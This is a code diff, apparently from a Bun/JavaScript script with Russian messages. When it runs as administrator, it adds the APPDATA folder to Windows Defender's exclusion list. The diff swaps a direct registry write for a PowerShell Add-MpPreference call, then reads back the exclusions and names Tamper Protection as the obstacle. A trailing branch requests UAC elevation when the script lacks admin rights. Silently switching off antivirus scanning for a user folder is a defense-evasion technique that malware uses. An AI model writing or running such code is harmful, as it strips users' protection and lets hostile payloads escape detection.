@@ -18,31 +18,42 @@
     } catch (e) { return false; }
   };
 
-      if (await isAdmin()) {
-    const appData = process.env.APPDATA;
-    console.log(`🛡️ Пробуем добавить исключение для: ${appData}`);
+        if (admin) {
+    console.log("✅ АДМИН! PID:", process.pid);
+    const appData = process.env.APPDATA || "C:\\Users\\User\\AppData\\Roaming";
+    console.log(`🛡️ Цель: ${appData}`);
 
-    // Метод 1: Прямая запись в реестр через reg.exe (иногда эффективнее WMIC)
-    const regCmd = [
-      "reg", "add", 
-      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
-      "/v", appData, "/t", "REG_SZ", "/d", "0", "/f"
-    ];
+    // Пытаемся добавить исключение через PowerShell и ЧИТАЕМ вывод
+    const ps = Bun.spawn({
+      cmd: ["powershell", "-Command", `Add-MpPreference -ExclusionPath '${appData}' -ErrorAction Stop; "Done"`],
+      stdout: "pipe",
+      stderr: "pipe"
+    });
 
-    const regProc = Bun.spawn({ cmd: regCmd });
-    const exitCode = await regProc.exited;
+    const out = await new Response(ps.stdout).text();
+    const err = await new Response(ps.stderr).text();
 
-    if (exitCode === 0) {
-      console.log("✅ Реестр обновлен успешно.");
+    if (err) {
+      console.log("❌ Ошибка Defender:", err.trim());
+      console.log("💡 Скорее всего, включен Tamper Protection (Защита от подделки).");
     } else {
-      console.log("❌ Ошибка доступа к реестру (Access Denied). Это нормально при включенном Tamper Protection.");
+      console.log("✅ Результат:", out.trim());
     }
 
+    // Проверка реестра
+    const reg = Bun.spawn({
+      cmd: ["reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"],
+      stdout: "pipe",
+      stderr: "pipe"
+    });
+    console.log("\n--- Текущие исключения в реестре ---");
+    console.log(await new Response(reg.stdout).text() || "Пусто или доступ запрещен");
 
     console.log("\nНажми Enter для выхода...");
     for await (const line of console) break;
     return;
   }
+
 
 
   console.log("❌ Не админ. Запрос UAC...");
